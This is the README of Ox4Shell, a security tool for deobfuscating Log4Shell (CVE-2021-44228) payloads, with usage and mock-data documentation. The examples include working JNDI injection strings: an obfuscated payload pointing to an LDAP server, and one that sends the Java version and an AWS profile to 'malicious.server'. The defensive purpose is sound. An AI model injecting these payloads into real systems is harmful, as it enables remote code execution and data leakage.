
<p align="center">
    <img alt="Ox4Shell" src="https://uploads-ssl.webflow.com/6097a2e324b791e6c3affd6e/61cafb3f5b7c5a33af49f9fe_Ox4Shell%20Logo%20-%20Color.png"/>
</p>

<hr/>

<p align="center">
    <img alt="maintained-oxeye" src="https://img.shields.io/badge/maintained%20by-oxeye.io-blueviolet"/>
    <img alt="python-3.8" src="https://img.shields.io/badge/python-3.8-green"/>
    <img alt="version-1.0" src="https://img.shields.io/badge/version-1.0-blue"/>
    <img alt="license-mit" src="https://img.shields.io/badge/license-MIT-lightgrey"/>
</p>

# Ox4Shell
Deobfuscate Log4Shell payloads with ease.

## Description
Since the release of the Log4Shell vulnerability (CVE-2021-44228), many tools were created to obfuscate Log4Shell payloads,
making the lives of security engineers a nightmare.

This tool intends to unravel the true contents of obfuscated Log4Shell payloads. 

For example, consider the following obfuscated payload:
```text
${zrch-Q(NGyN-yLkV:-}${j${sm:Eq9QDZ8-xEv54:-ndi}${GLX-MZK13n78y:GW2pQ:-:l}${ckX:2@BH[)]Tmw:a(:-da}${W(d:KSR)ky3:bv78UX2R-5MV:-p:/}/1.${)U:W9y=N:-}${i9yX1[:Z[Ve2=IkT=Z-96:-1.1}${[W*W:w@q.tjyo@-vL7thi26dIeB-HxjP:-.1}:38${Mh:n341x.Xl2L-8rHEeTW*=-lTNkvo:-90/}${sx3-9GTRv:-Cal}c$c${HR-ewA.mQ:g6@jJ:-z}3z${uY)u:7S2)P4ihH:M_S8fanL@AeX-PrW:-]}${S5D4[:qXhUBruo-QMr$1Bd-.=BmV:-}${_wjS:BIY0s:-Y_}p${SBKv-d9$5:-}Wx${Im:ajtV:-}AoL${=6wx-_HRvJK:-P}W${cR.1-lt3$R6R]x7-LomGH90)gAZ:NmYJx:-}h}
```

After running Ox4Shell, it would transform into an intuitive and readable form:
```text
${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}
```


## Usage
To run the tool simply:
```
~/Ox4Shell » python ox4shell.py --help
usage: ox4shell [-h] [-d] [-m MOCK] [--max-depth MAX_DEPTH] (-p PAYLOAD | -f FILE)

   ____       _  _   _____ _          _ _ 
  / __ \     | || | / ____| |        | | |
 | |  | |_  _| || || (___ | |__   ___| | |
 | |  | \ \/ /__   _\___ \| '_ \ / _ \ | |
 | |__| |>  <   | | ____) | | | |  __/ | |
  \____//_/\_\  |_||_____/|_| |_|\___|_|_|

Ox4Shell - Deobfuscate Log4Shell payloads with ease.
    Created by https://oxeye.io

General:
  -h, --help            show this help message and exit
  -d, --debug           Enable debug mode (default: False)
  -m MOCK, --mock MOCK  The location of the mock data JSON file that replaces certain values in the payload (default: mock.json)
  --max-depth MAX_DEPTH
                        The maximum number of iteration to perform on a given payload (default: 150)

Targets:
  Choose which target payloads to run Ox4Shell on

  -p PAYLOAD, --payload PAYLOAD
                        A single payload to deobfuscate, make sure to escape '$' signs (default: None)
  -f FILE, --file FILE  A file containing payloads delimited by newline (default: None)
```


## Mock Data
The Log4j library has a few unique lookup functions, which allow users to look up environment variables, runtime 
information on the Java process, and so forth. This capability grants threat actors the ability to probe for specific 
information that can uniquely identify the compromised machine they targeted.

Ox4Shell uses the `mock.json` file to insert common values into certain lookup function, for example,
if the payload contains the value `${env:HOME}`, we can replace it with a custom mock value.

The default set of mock data provided is:
```json
{
    "hostname": "ip-127.0.0.1",
    "env": {
        "aws_profile": "staging",
        "user": "ubuntu",
        "pwd": "/opt/",
        "path": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin"
    },
    "sys": {
        "java.version": "16.0.2",
        "user.name": "ubuntu"
    },
    "java": {
        "version": "Java version 16.0.2",
        "runtime": "OpenJDK Runtime Environment (build 1.8.0_181-b13) from Oracle Corporation",
        "vm": "OpenJDK 64-Bit Server VM (build 25.181-b13, mixed mode)",
        "os": "Linux 5.10.47-linuxkit unknown, architecture: amd64-64",
        "locale": "default locale: en_US, platform encoding: UTF-8",
        "hw": "processors: 1, architecture: amd64-64"
    }
}

```

As an example, we can deobfuscate the following payload using the Ox4Shell's mocking capability:
```bash
~/Ox4Shell >> python ox4shell.py -p "\${jndi:ldap://\${sys:java.version}.\${env:AWS_PROFILE}.malicious.server/a}"  
${jndi:ldap://16.0.2.staging.malicious.server/a}
```

## Authors
- [Daniel Abeles](https://twitter.com/Daniel_Abeles)
- [Ron Vider](https://twitter.com/ron_vider)


## License
The source code for the project is licensed under the MIT license, which you can find in the LICENSE file.
